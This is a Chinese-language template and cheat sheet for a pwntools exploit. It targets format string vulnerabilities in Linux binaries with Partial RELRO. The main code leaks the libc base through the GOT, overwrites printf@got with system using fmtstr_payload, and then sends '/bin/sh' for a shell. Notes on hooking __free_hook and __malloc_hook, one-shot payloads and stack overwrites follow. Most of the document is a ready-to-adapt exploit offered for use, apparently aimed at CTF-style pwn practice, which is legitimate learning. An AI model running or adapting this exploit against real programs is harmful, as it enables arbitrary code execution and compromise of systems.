
# 模板概览与入口

本模板提供了一个经典的、两阶段的格式化字符串漏洞利用的 `pwntools` EXP 骨架。该方法首先利用 `%s` 说明符读取某个已解析函数在 GOT 表中的地址，从而泄露 libc 基址；然后，利用 `pwntools` 的 `fmtstr_payload` 函数自动生成 `%n` 写入 payload，将另一个函数的 GOT 表项（如 `printf@got`）覆盖为 `system` 的地址，最终通过调用这个被劫持的函数来获取 Shell。

此模板适用于存在可多次利用的格式化字符串漏洞，且程序的 RELRO 保护为 Partial（即 GOT 表可写）的场景。

**核心入口代码片段**：

```python
from pwn import *

# --- 环境设置 ---
context.arch = 'amd64'
elf = ELF('./your_binary')
libc = ELF('./libc.so.6')

# --- 漏洞利用 ---
# 1. 确定格式化字符串偏移
# 通过 gdb.attach 或手动发送 AAAA.%p.%p... 来确定
fmt_offset = 6 

# 2. 选择泄露和覆盖的目标
func_to_leak = 'puts'
func_to_overwrite = 'printf'
puts_got = elf.got[func_to_leak]
printf_got = elf.got[func_to_overwrite]

# --- 第一阶段：泄露 libc 地址 ---
log.info("Stage 1: Leaking libc address...")
# 构造 payload: %<offset>$s + [addr_to_leak]
payload_leak = b'%' + str(fmt_offset + 1).encode() + b'$s' # +1 因为地址被放在了 payload 的第二部分
payload_leak = payload_leak.ljust(16, b'\x00') # 填充以对齐
payload_leak += p64(puts_got)

io.sendline(payload_leak)

# 解析地址
leaked_addr = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leaked_addr - libc.symbols[func_to_leak]
log.success(f"Libc base found: {hex(libc.address)}")

# --- 第二阶段：覆盖 GOT 表 ---
log.info("Stage 2: Overwriting GOT with system address...")
system_addr = libc.symbols['system']

# 使用 fmtstr_payload 自动生成写入 payload
payload_write = fmtstr_payload(fmt_offset, {printf_got: system_addr}, numbwritten=0, write_size='byte')

io.sendline(payload_write)

# --- 第三阶段：触发 Shell ---
log.info("Stage 3: Triggering shell...")
# 再次调用被覆盖的函数，其行为已变为 system()
io.sendline(b'/bin/sh')

io.interactive()
```

# 攻击关键点速查

- **重要钩子 (Key Hooks)**
  - **`printf` 等格式化函数**: 漏洞的直接入口。
  - **GOT (Global Offset Table)**: 在 Partial RELRO 环境下，GOT 表是可写的，是任意地址写的绝佳目标。
    - **泄露目标**: 通常选择一个在程序前期已被调用的函数（如 `puts`, `read`），确保其 GOT 表项已被解析为真实地址。
    - **覆盖目标**: 通常选择一个在 EXP 后续流程中还会被调用的函数（如 `printf`, `exit`），以便触发被修改的指针。
  - **`__free_hook`, `__malloc_hook`**: 如果是 Full RELRO 环境，这些位于 libc 数据段的函数指针是备选的覆盖目标。

- **关键结构体 (Key Structures)**
  - **泄露 Payload**: `%<offset>$s` 用于读取指定地址的字符串内容。Payload 需要包含目标地址，并让位置参数指向它。
  - **写入 Payload (`%n`)**: `...%<num>c%<offset>$hhn...` 是手动构造写入 payload 的基本形式，其中 `%<num>c` 用于填充已输出的字符数，`%<offset>$hhn` 用于将这个数量（的低字节）写入目标地址。`pwntools.fmtstr_payload` 极大地简化了这一过程。

- **主要攻击面 (Main Attack Surfaces)**
  - **用户可控的缓冲区**: 任何被直接传递给 `printf` 家族函数的缓冲区都是攻击面。
  - **可写的函数指针**: GOT 表、libc hooks、栈上返回地址等。

# 迭代扩展思路

- **从骨架到稳定 EXP 的演进**
  1.  **自动化偏移确定**: 在 EXP 开头集成一个自动确定格式化字符串偏移的函数。可以启动一个子进程，发送 `AAAA.%p.%p...`，然后分析输出来找到偏移，避免手动调试。
      ```python
      # def get_fmt_offset():
      #     ...
      # fmt_offset = get_fmt_offset()
      ```
  2.  **处理一次性漏洞**: 如果漏洞只能触发一次，EXP 必须在一个 payload 内完成所有操作。这极具挑战性，通常的思路是：
      -   将 GOT 表中某个函数的地址覆盖为 `main` 函数或漏洞触发函数的地址，从而获得第二次执行机会。
      -   或者，直接将栈上的返回地址覆盖为漏洞触发函数的地址。
      -   这需要精确地将多个写入操作组合在一个 `fmtstr_payload` 中。
  3.  **应对 Full RELRO**:
      -   修改攻击目标，从 GOT 表转向 `__free_hook` 或 `__malloc_hook`。利用 `%n` 覆盖这些 hook 为 `system` 或 `one-gadget` 的地址。
      -   流程变为：泄露 libc 基址 -> 计算 hook 和 `system` 地址 -> `%n` 覆盖 hook -> 触发 hook (`free()` 或 `malloc()`)。
  4.  **栈上写入**:
      -   如果能泄露栈地址（例如，通过 `%p` 泄露的某个值与 `rsp` 的偏移是固定的），也可以直接用 `%n` 覆盖栈上的返回地址。
      -   这通常比 GOT 覆写更复杂，因为返回地址在函数返回时才生效，可能需要更精巧的时序控制。
  5.  **优化 Payload**: `fmtstr_payload` 有 `write_size` 参数 (`'byte'`, `'short'`, `'int'`)。根据目标架构和地址的特点，选择 `'short'` (双字节写) 可能比 `'byte'` (单字节写) 生成更短的 payload，在有长度限制时非常有用。
  6.  **封装为函数**: 将泄露和写入过程封装成独立的函数，如 `leak(addr)` 和 `write(addr, value)`，使主逻辑更清晰。
      ```python
      # def leak(addr):
      #     payload = ...
      #     p.sendline(payload)
      #     return u64(p.recv(6).ljust(8, b'\x00'))
      # 
      # def write(addr, value):
      #     payload = fmtstr_payload(fmt_offset, {addr: value})
      #     p.sendline(payload)
      ```
